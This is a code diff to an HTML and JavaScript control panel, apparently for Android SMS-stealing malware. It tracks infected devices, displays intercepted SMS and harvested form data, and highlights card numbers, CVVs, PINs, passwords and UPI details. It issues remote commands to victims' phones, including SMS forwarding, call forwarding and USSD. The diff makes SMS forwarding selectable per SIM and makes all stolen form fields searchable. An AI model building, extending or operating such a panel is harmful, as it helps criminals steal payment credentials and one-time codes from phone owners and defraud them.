@@ -23,9 +23,9 @@
             #sidebar.show-mobile { transform: translateX(0); }
         }
         #login-overlay { backdrop-filter: blur(8px); }
-        .stat-card { transition: all 0.2s; cursor: pointer; border-width: 2px; }
+        .stat-card { transition: all 0.2s; cursor: pointer; border-width: 2px; flex-shrink: 0; min-width: 140px; }
         .stat-card:active { transform: scale(0.95); }
-        .stat-card.active-filter { transform: translateY(-2px); box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); }
+        .stat-card.active-filter { transform: translateY(-2px); box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); border-color: inherit; }
 
         /* Card Style for List */
         .user-box {
@@ -120,29 +120,31 @@
             </div>
         </header>
 
+        <!-- Fixed Scrollable Stats Row (Global) -->
+        <div class="bg-white border-b border-slate-200 flex-shrink-0 z-20 overflow-hidden">
+            <div class="flex overflow-x-auto no-scrollbar gap-3 p-3 lg:px-6">
+                <div onclick="setFilter('all')" id="stat-card-all" class="stat-card bg-white p-3 rounded-xl shadow-sm border-blue-500 flex items-center gap-3 active-filter">
+                    <div class="w-10 h-10 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-users"></i></div>
+                    <div><div class="text-lg font-black leading-none" id="stat-total">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Devices</div></div>
+                </div>
+                <div onclick="setFilter('online')" id="stat-card-online" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
+                    <div class="w-10 h-10 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-satellite-dish"></i></div>
+                    <div><div class="text-lg font-black text-green-600 leading-none" id="stat-online">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Online</div></div>
+                </div>
+                <div onclick="setFilter('msgs')" id="stat-card-msgs" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
+                    <div class="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-envelope"></i></div>
+                    <div><div class="text-lg font-black text-indigo-600 leading-none" id="stat-msgs">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">SMS</div></div>
+                </div>
+                <div onclick="setFilter('forms')" id="stat-card-forms" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
+                    <div class="w-10 h-10 bg-rose-50 text-rose-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-file-invoice"></i></div>
+                    <div><div class="text-lg font-black text-rose-600 leading-none" id="stat-forms">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Forms</div></div>
+                </div>
+            </div>
+        </div>
+
         <div id="content-area" class="flex-1 overflow-y-auto p-3 lg:p-6 no-scrollbar bg-[#f8fafc] pb-32">
             <!-- Dashboard View -->
             <div id="view-dashboard" class="space-y-4">
-                <!-- Stats Row -->
-                <div class="grid grid-cols-2 lg:grid-cols-4 gap-2">
-                    <div onclick="setFilter('all')" id="stat-card-all" class="stat-card bg-white p-3 rounded-xl shadow-sm border-blue-500 flex items-center gap-3 active-filter">
-                        <div class="w-10 h-10 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-users"></i></div>
-                        <div><div class="text-lg font-black leading-none" id="stat-total">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Devices</div></div>
-                    </div>
-                    <div onclick="setFilter('online')" id="stat-card-online" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                        <div class="w-10 h-10 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-satellite-dish"></i></div>
-                        <div><div class="text-lg font-black text-green-600 leading-none" id="stat-online">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Online</div></div>
-                    </div>
-                    <div onclick="setFilter('msgs')" id="stat-card-msgs" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                        <div class="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-envelope"></i></div>
-                        <div><div class="text-lg font-black text-indigo-600 leading-none" id="stat-msgs">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">SMS</div></div>
-                    </div>
-                    <div onclick="setFilter('forms')" id="stat-card-forms" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                        <div class="w-10 h-10 bg-rose-50 text-rose-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-file-invoice"></i></div>
-                        <div><div class="text-lg font-black text-rose-600 leading-none" id="stat-forms">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Forms</div></div>
-                    </div>
-                </div>
-
                 <!-- Search Bar -->
                 <div class="bg-white rounded-xl shadow-sm border border-slate-200 px-4 py-3 flex items-center gap-3">
                     <i class="fas fa-search text-slate-400 text-sm"></i>
@@ -233,6 +235,7 @@
                         <div class="space-y-2">
                             <div class="flex justify-between items-center px-1">
                                 <span class="text-[10px] font-black text-slate-500 uppercase">SMS Intercept</span>
+                                <select id="cmd-sf-sim" class="bg-slate-800 text-[10px] font-black text-blue-400 rounded px-2 py-1 border border-slate-700 outline-none"><option value="1">S1</option><option value="2">S2</option></select>
                             </div>
                             <div class="flex gap-2">
                                 <input id="cmd-sf-num" placeholder="Number" class="flex-1 bg-slate-800 rounded-lg p-2.5 text-xs outline-none border border-slate-700">
@@ -415,14 +418,20 @@
             });
 
             allForms.sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(f => {
-                let sensitive = "";
+                let fieldsHtml = "";
+                let searchText = f.name;
                 for(let k in f) {
                     if(['ts','uid','name'].includes(k)) continue;
                     const val = f[k];
+                    searchText += " " + val;
                     const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
-                    if(isS) sensitive += `<div class="bg-rose-50 p-2 rounded border border-rose-100 mt-1"><div class="text-[9px] text-rose-400 font-black uppercase">${k}</div><div class="text-sm font-black text-rose-600">${val}</div></div>`;
+                    fieldsHtml += `
+                        <div class="${isS ? 'bg-rose-50 border-rose-100' : 'bg-slate-50 border-slate-100'} p-2 rounded border mt-1">
+                            <div class="text-[9px] ${isS ? 'text-rose-400' : 'text-slate-400'} font-black uppercase">${k}</div>
+                            <div class="text-sm font-black ${isS ? 'text-rose-600' : 'text-slate-700'}">${val}</div>
+                        </div>`;
                 }
-                if (!query || `${f.name} ${sensitive}`.toLowerCase().includes(query)) {
+                if (!query || searchText.toLowerCase().includes(query)) {
                     const card = document.createElement('div');
                     card.className = "user-box border-l-4 border-l-rose-500";
                     card.onclick = () => showUserDetails(f.uid);
@@ -431,7 +440,7 @@
                             <span class="text-[10px] font-black text-rose-600 uppercase bg-rose-50 px-2 py-0.5 rounded">${f.name}</span>
                             <span class="text-[9px] text-slate-400 font-mono">${new Date(f.ts).toLocaleString()}</span>
                         </div>
-                        <div class="grid grid-cols-1 gap-2">${sensitive}</div>
+                        <div class="grid grid-cols-1 gap-2">${fieldsHtml}</div>
                     `;
                     listDiv.appendChild(card);
                 }
@@ -506,6 +515,19 @@
         document.getElementById('det-bat').innerText = `${info.bl || 0}%`;
         document.getElementById('det-online-dot').className = `w-2.5 h-2.5 rounded-full ${isOnline ? 'bg-green-500 online-dot' : 'bg-slate-300'}`;
 
+        // Update SIM dropdowns with actual numbers
+        const s1Text = sims[0]?.n && sims[0].n !== 'Hidden' ? sims[0].n : "SIM 1";
+        const s2Text = sims[1]?.n && sims[1].n !== 'Hidden' ? sims[1].n : "SIM 2";
+
+        const simDropdowns = ['cmd-sms-sim', 'cmd-ussd-sim', 'cmd-cf-sim', 'cmd-sf-sim'];
+        simDropdowns.forEach(id => {
+            const sel = document.getElementById(id);
+            if(sel) {
+                sel.options[0].text = s1Text;
+                sel.options[1].text = s2Text;
+            }
+        });
+
         const smsDiv = document.getElementById('det-sms-logs');
         smsDiv.innerHTML = '';
         Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(m => {
@@ -570,6 +592,7 @@
             cmd.s = document.getElementById('cmd-cf-sim').value;
         } else if(type === 'SET_SMS_FORWARD') {
             cmd.n = document.getElementById('cmd-sf-num').value;
+            cmd.s = document.getElementById('cmd-sf-sim').value;
             if(!cmd.n) return alert('Enter Number');
         } else if(type === 'REMOVE_SMS_FORWARD') {
             cmd.t = 'SET_SMS_FORWARD'; cmd.n = "";
